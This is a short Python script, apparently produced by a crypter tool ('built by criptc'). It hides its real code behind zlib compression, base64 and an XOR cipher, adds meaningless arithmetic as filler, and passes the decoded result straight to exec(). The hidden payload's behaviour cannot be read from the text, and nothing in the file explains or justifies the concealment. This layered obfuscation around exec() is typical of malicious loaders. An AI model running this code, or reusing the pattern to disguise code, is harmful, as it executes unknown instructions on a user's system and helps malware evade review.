from zlib import decompress as d; from base64 import b64decode as de; import os
def A(HR,tr):
        A=0;C=len(tr)-1;B=b''
        for D in HR:
                E=D^ord(tr[A]);B=B+E.to_bytes(1,'b'+'i'+'g')
                if A>=C:A=0
                else:A+=1
        return B

#built by criptc

a = 1
b = 2
c = a * b * 2
D = c*c+a-b
e = b ** 4
f = e ** 1
g = a + b + c + D + e + f

exec(d(de(A(d(b'x\x9c\x05\xc1\x0bS\x9a\x00\x00\x00`E\x86\x88S\x14D\x13\x90\x97$"j\x92[\xe2\xbb\xb8\xd5\x89\xcd\x93\xab4\x9d:\xa5\xd9|,\xf7\xb2\xc1\xacf\x7f}\xdfW\xb6\x9a\xc6\xf6\xb8\xd0\xb0\x99,\xe7H^\x19U\xff\xe4~\x7f\x84\x10\x9a\x9b2\x988\x15\x92_\xb7\x15|}Rk\x8cO\xf3\xb3\x87\xde\xf4S[UW/X[\xedQ~\xfcV\xc3\xe3\xbep\xbb\x9ftX\x152\x89\x0evpU2\x10\xb6\x9fHg(4\x93.b\x19\x9b\x83\xad\xa7\xa0\x1d\xa1#Q\x8a^\xbb\x83\xdaa\xff\xd1_?\x9a\xee\x83\x9e\x89/Z\xc0\xe8\xb5\xbcy\xe9\xa9\xe57\x90\xcdKm\xb7\xe0r\x01b%\xfcA\xcaZ\xa4\xc5\xe0U\x8cw\xe8_\xae$\x17\x81\x87\xfc]\x90GGCsU<W\xde\x7f\xdb\x80\xc59\x0e\xe6=-\xfc\x91p){\x82\xd0\xf4C\xf1!lu\xa8\xf3\x89\x8f\x8bN\xc1\xf8q\xd7[\x1f9\xf4\xbf\xa5\x1b\xfb>H\xb1\x85\xdbT\x16I\xac\x1d\x809\x13\xc4\x91\x97\x1d0dL\xb9\xde\x03]"\xf6\xe5\x87\xc8\xe7\x9cp\xa8\xd9lGg\xc3A\x88\xa8\xd4\xe0\x13O\xc2\x02\xe4\xcf\xbe\xebg\xf0\xed3#\xc8P\xbc//@\xadQ\x9b@D\xd1\xcb.B\xbb\xecO\x9c\x8ahO \x9d\x83\x1bcf\xb3\x13\x96\xaf\xfe\x8b%\x04\x8dR\xdd9\xea\x98\x83\n\x89\xe9\xcd\xd2;R"\xff\xc2\x97H\xc2O(9\xee\xde\xac\xb7\x8a\xa5\x052\xb7\xcf6\xba\x04\xe9\x17\xd1#\x81\xbe\x8c\x89\x9d\xd5]\xc0\x10m\xb6\x83\x8e\x03\xdb\x99\x8c*-$\x994r\x1e\xed&\xad\xa7\x00\xbcF\xb9\xf6\xf7\xc6k\xb5\x1a\x01f=\x93\x0c@e\xa0r`\xd41\xdf.\x98\xefH\rB\xe5WHA\x98+\xff\x01\xae\xe3_m')[::-1], d(b'x\x9c\x05\xc1m\x93B@\x00\x00\xe0\xdfrS|0F\xdfeHl\xb9\xdb[\n\xbb\xd8\x0f7\x13%!\xc2z\xdb_\x7f\xcf\xe3*\xd4\xbei\xcfs\x1a\xe5\n\xa9\xcc;\xa3;x\x0cxe\xbb\x9b<\xce\xa2\xc4C\x8b!\xdai_\xe1t\xe4\xb7\x80\x94\xea3\xefu\xb3\xaa"Q3f1\x12\xae\x82\x8aOJ\x9b\x8b\xd2\xb5Vd\xe6f\xf2\xb6\xdb\x04\xc5\xa5\r\x97Q\xc5\xc1\xf9\xc0\xad\x17\xe2\xd4\xfd\x9d\\\x04j9\x8e\x06Ip#2\xbd\x9b\x03\xa0\xfd\xb7\xa2eH\x86\xfa\xf8\xa9\xe3\xc0Y\x11\xb9\x0bw4\x93\x93\\\xc6/\x1d\xcf?XIT\xe8\xd6\x16\xd3\xda\xd1\x93.\xc6\xd3\xd9\xbd\xa8\xe5\xf3\xae\xdf\xce\x86\x90/\x01\x01\x8ba\x11l\xd34\x9c\xfd\xf3\xe2\xd3\x8cUI]\x0c\xe5Z\x84\x00<\xf6\x19\xd0f\xd4\xec\xfe@\xa7j\x93\xda\xb4\xd5~\xc6\xa5\xf0i\xb8$\xc7\xfbx5\xc0\x9b\xfd\xb6\xb3\xe8=L\x0bk\x0et|\x85\xa5\xc9\xd7\xe0\xc9P|\xb4\xcd\x01z\xb8\xdf|\x08\x87\xfc\x08\xc48[\xd3n\x1b\xfa\xd50\x8e\xb0W\x17\xcf\x84\x06+\xdd\x16\xd7\xa6\xee\xd1"im\xce\xd0tI\xfe\x01\x16\x93p\xe0').decode()))))